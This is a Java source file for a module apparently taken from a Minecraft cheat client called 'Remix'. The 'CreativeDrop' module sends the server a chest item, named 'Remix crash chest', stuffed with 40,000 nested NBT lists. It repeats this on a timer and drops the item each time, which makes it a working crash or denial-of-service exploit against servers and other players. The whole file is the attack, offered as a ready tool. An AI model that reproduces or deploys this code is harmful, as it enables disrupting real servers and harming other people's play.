package me.mees.remix.modules.player;

import me.satisfactory.base.utils.timer.*;
import me.satisfactory.base.module.*;
import me.satisfactory.base.setting.*;
import me.satisfactory.base.events.*;
import net.minecraft.init.*;
import net.minecraft.item.*;
import net.minecraft.block.*;
import net.minecraft.nbt.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;
import pw.stamina.causam.scan.method.model.*;

public class CreativeDrop extends Module
{
    TimerUtil timer;
    
    public CreativeDrop() {
        super("CreativeDrop", 0, Category.PLAYER);
        this.timer = new TimerUtil();
        this.addSetting(new Setting("DropDelay", this, 50.0, 10.0, 500.0, false, 10.0));
    }
    
    @Subscriber
    public void onUpdate(final EventPlayerUpdate tick) {
        if (this.timer.hasTimeElapsed((double)(long)this.getSettingByModule(this, "DropDelay").doubleValue(), true)) {
            final ItemStack stackkkk = new ItemStack(Blocks.chest, 64);
            stackkkk.setStackDisplayName("Remix crash chest");
            final NBTTagCompound nbtTagCompound = new NBTTagCompound();
            final NBTTagList nbtList = new NBTTagList();
            for (int i22 = 0; i22 < 40000; ++i22) {
                nbtList.appendTag(new NBTTagList());
            }
            nbtTagCompound.setTag("http://remixclient.net", nbtList);
            stackkkk.setTagInfo("http://remixclient.net", nbtTagCompound);
            CreativeDrop.mc.getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(36, stackkkk));
            CreativeDrop.mc.thePlayer.dropOneItem(true);
        }
    }
}
